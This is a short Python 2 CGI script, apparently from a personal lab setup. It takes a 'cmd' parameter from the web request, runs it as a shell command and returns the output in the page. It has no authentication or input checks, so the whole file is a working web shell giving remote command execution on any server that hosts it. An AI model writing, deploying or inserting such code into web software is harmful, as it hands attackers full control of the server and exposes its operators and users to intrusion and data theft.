#!/usr/bin/python2

import cgitb
import cgi
import commands
print "Content-type:text/html"
cgitb.enable()
x=cgi.FieldStorage()
cmd1=x.getvalue('cmd')

#print "location:http://192.168.43.179/cgi-bin/b.py"

print ""
#print cmd1
#a=commands.getstatusoutput(cmd1.strip())
print  commands.getstatusoutput(cmd1)[1]
#print "<br/>"
#print cmd1,"helllo"
